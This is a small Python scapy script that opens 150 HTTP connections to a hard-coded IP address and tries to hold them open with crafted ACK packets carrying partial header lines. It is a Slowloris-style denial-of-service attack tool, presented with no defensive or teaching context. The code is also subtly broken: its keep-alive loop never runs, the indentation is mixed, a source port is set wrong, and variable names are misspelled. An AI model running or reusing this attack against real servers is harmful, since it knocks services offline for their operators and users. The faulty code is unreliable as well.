#!/usr/bin/env python

# Imports
from scapy.all import *
from request_http import *
import time
import random


def main():
    ip_address = "35.204.165.14"
    #ip_address = "asdkappadue.it"
    port = random.randint(1024,6000) # 4213 
    ip = IP(dst=ip_address)
    server_port=80
    list_size = 150
    port_list = list(range(port, port + list_size))

    seqAckList = []
    seqNumList = []

    for _ in range(list_size):
        seqNumList.append(1) #init of seq numb
        seqAckList.append(1) #init of ack numb

    print(port_list)

    for p in range(list_size):
        seqNumList[p], seqAckList[p] = httpRequest(ip_address,port_list[p], seqNumList[p])
    
    for n in range(0):
	for p in range(list_size):
            ACK = ip/TCP(sport=p,
                         dport=server_port,
                         flags="A",
                         seq=seqNumList[p],
                         ack=seqAckList[p])
            MYNUMBER=ACK/"X-a: {}\r\r".format(random.randint(1,5000)).encode("utf-8")
            answerMyNumber = sr1(MYNUMBER)
            seqNumlist[p]+= 1
            seqAcklist[p] = answerMyNumber.seq
        
if __name__== "__main__":
    main()

